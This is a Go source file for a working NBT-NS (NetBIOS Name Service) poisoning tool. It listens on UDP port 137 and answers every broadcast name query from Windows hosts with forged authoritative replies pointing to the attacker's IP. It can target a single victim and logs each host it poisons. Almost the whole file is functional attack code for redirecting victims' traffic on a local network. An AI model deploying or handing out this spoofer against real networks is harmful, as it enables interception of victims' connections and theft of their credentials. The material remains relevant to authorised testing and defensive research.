// Package nbns implements an NBT-NS (NetBIOS Name Service, RFC 1002) poisoner.
//
// When a Windows host can't resolve a name via DNS or LLMNR it falls back to
// NBT-NS — a UDP broadcast to 255.255.255.255:137. We listen on port 137,
// parse every incoming NB name query, and reply with our own IP so the
// victim connects to us instead of the real host.
//
// Wire format of an NBT-NS query (RFC 1002 §4.2.12):
//
//	[TID 2][FLAGS 2][QDCOUNT 2][ANCOUNT 2][NSCOUNT 2][ARCOUNT 2]
//	[QNAME_LEN 1=0x20][QNAME 32][NULL 1][QTYPE 2=0x0020][QCLASS 2=0x0001]
//
// The 32-byte QNAME uses NetBIOS "first-level" half-ASCII encoding:
// each byte of the original 16-byte name becomes two letters A-P,
// where letter = 'A' + nibble.
package nbns

import (
	"fmt"
	"net"
	"strings"
	"sync"
)

const Port = 137

// Poisoner listens on UDP :137 and answers every NB name query with its
// own interface IPv4 address.
type Poisoner struct {
	Interface string
	RelayFrom string // if non-empty, only respond to queries from this IP

	mu   sync.Mutex
	seen map[string]struct{}
}

// Run binds UDP :137 and blocks, poisoning every NB name query until the
// socket breaks or the process exits.
func (p *Poisoner) Run() error {
	if p.seen == nil {
		p.seen = make(map[string]struct{})
	}

	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}

	ourIP, err := ifaceIPv4(iface)
	if err != nil {
		return err
	}

	// Bind to all interfaces on UDP 137 to receive broadcast NB-NS queries.
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", Port))
	if err != nil {
		return fmt.Errorf("listen udp4 :137: %w", err)
	}
	defer conn.Close()

	fmt.Printf("\x1b[96m[NBT-NS]\x1b[0m Poisoner started  interface=%s  listen=0.0.0.0:%d  spoof=%s\n",
		p.Interface, Port, ourIP)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			return fmt.Errorf("read: %w", err)
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go p.handle(conn, pkt, src, ourIP)
	}
}

// handle processes one incoming NBT-NS packet.
func (p *Poisoner) handle(conn net.PacketConn, data []byte, src net.Addr, ourIP net.IP) {
	// Need at least the full NB name query: header(12) + len(1) + name(32) + null(1) + type(2) + class(2) = 50
	if len(data) < 50 {
		return
	}

	// Flags at data[2:4] must be 0x0110: NB name query, broadcast, RD=1.
	if data[2] != 0x01 || data[3] != 0x10 {
		return
	}

	// QNAME length byte at data[12] must be 0x20 (32 = encoded name length).
	if data[12] != 0x20 {
		return
	}

	udpSrc, ok := src.(*net.UDPAddr)
	if !ok {
		return
	}
	srcIP := strings.TrimPrefix(udpSrc.IP.String(), "::ffff:")

	// Don't answer our own queries.
	if srcIP == ourIP.String() {
		return
	}

	// When relay-from is set, only respond to that specific host.
	if p.RelayFrom != "" && srcIP != p.RelayFrom {
		return
	}

	// Decode the NetBIOS name from the 32 encoded bytes at data[13:45].
	name := decodeNBTName(data[13:45])
	if name == "" {
		return
	}

	// Determine the requested service from the last 2 encoded bytes + null
	// at data[43:46].  These encode the 16th (suffix) byte of the NB name.
	service := nbtNSRole(data[43], data[44], data[45])

	// Build and send the NBT_Ans response.
	resp := buildNBTAns(data, ourIP)
	if _, err := conn.WriteTo(resp, src); err != nil {
		fmt.Printf("[!] \x1b[96m[NBT-NS]\x1b[0m send to %s failed: %v\n", srcIP, err)
		return
	}

	p.logOnce(srcIP, name, service)
}

// logOnce prints a poisoning event, deduplicating per (srcIP, name) pair.
func (p *Poisoner) logOnce(srcIP, name, service string) {
	key := srcIP + "|" + name
	p.mu.Lock()
	_, dup := p.seen[key]
	if !dup {
		p.seen[key] = struct{}{}
	}
	p.mu.Unlock()

	if !dup {
		fmt.Printf("\x1b[96m[NBT-NS]\x1b[0m Poisoned answer sent to %s for name %s (service: %s)\n",
			srcIP, name, service)
	}
}

// buildNBTAns constructs the NBT-NS answer packet.
//
//	Header (12 bytes): TID + Flags(0x8500) + QDCOUNT=0 + ANCOUNT=1 + NS=0 + AR=0
//	Answer RR:         NbtName(34) + TYPE(0x0020) + CLASS(0x0001) +
//	                   TTL(300000s) + RDLENGTH(6) + NB_FLAGS(0x0000) + IP(4)
func buildNBTAns(query []byte, ourIP net.IP) []byte {
	ip4 := ourIP.To4()

	pkt := make([]byte, 0, 62)

	// Header
	pkt = append(pkt, query[0], query[1]) // TID (echo transaction ID)
	pkt = append(pkt, 0x85, 0x00)         // FLAGS: QR=1, AA=1, response
	pkt = append(pkt, 0x00, 0x00)         // QDCOUNT = 0
	pkt = append(pkt, 0x00, 0x01)         // ANCOUNT = 1
	pkt = append(pkt, 0x00, 0x00)         // NSCOUNT = 0
	pkt = append(pkt, 0x00, 0x00)         // ARCOUNT = 0

	// Answer resource record: echo the question name section verbatim.
	// data[12:46] = length_byte(1=0x20) + encoded_name(32) + null(1) = 34 bytes.
	pkt = append(pkt, query[12:46]...)    // RRNAME (34 bytes)
	pkt = append(pkt, 0x00, 0x20)         // TYPE  = NB (0x0020)
	pkt = append(pkt, 0x00, 0x01)         // CLASS = IN
	pkt = append(pkt, 0x00, 0x04, 0x93, 0xe0) // TTL  ≈ 300 000 s (≈3.5 days)
	pkt = append(pkt, 0x00, 0x06)         // RDLENGTH = 6
	pkt = append(pkt, 0x00, 0x00)         // NB_FLAGS: unique, B-node
	pkt = append(pkt, ip4[0], ip4[1], ip4[2], ip4[3]) // NB_ADDRESS: attacker IP

	return pkt
}

// decodeNBTName decodes the 32-byte NetBIOS half-ASCII encoded name.
//
// Each pair (a, b) of encoded bytes maps to one character of the original
// 16-byte NB name: char = ((a - 'A') << 4) | (b - 'A').
// Only the first 15 characters are returned (position 15 is the suffix/service byte).
// Trailing spaces are stripped.
func decodeNBTName(encoded []byte) string {
	if len(encoded) < 32 {
		return ""
	}
	out := make([]byte, 0, 15)
	for i := 0; i < 15; i++ {
		a, b := encoded[i*2], encoded[i*2+1]
		if a < 0x41 || b < 0x41 {
			break
		}
		ch := ((a - 0x41) << 4) | ((b - 0x41) & 0x0f)
		if ch == 0x00 {
			break
		}
		if ch >= 0x20 && ch <= 0x7e {
			out = append(out, ch)
		}
	}
	return strings.TrimRight(string(out), " ")
}

// nbtNSRole maps the three suffix bytes (last 2 encoded bytes + null terminator)
// to a human-readable service name.
//
// The suffix byte at NB name position 15 is encoded as two letters at
// data[43:45]; data[45] is the QNAME null terminator.
func nbtNSRole(a, b, null byte) string {
	if null != 0x00 {
		return "Unknown"
	}
	switch {
	case a == 0x41 && b == 0x41: return "Workstation/Redirector" // suffix 0x00
	case a == 0x41 && b == 0x42: return "Browser"               // suffix 0x01
	case a == 0x42 && b == 0x4c: return "Domain Master Browser" // suffix 0x1b
	case a == 0x42 && b == 0x4d: return "Domain Controller"     // suffix 0x1c
	case a == 0x42 && b == 0x4e: return "Local Master Browser"  // suffix 0x1d
	case a == 0x42 && b == 0x4f: return "Browser Election"      // suffix 0x1e
	case a == 0x43 && b == 0x41: return "File Server"           // suffix 0x20
	default: return "Unknown"
	}
}

// ifaceIPv4 returns the first unicast IPv4 address bound to iface.
func ifaceIPv4(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}
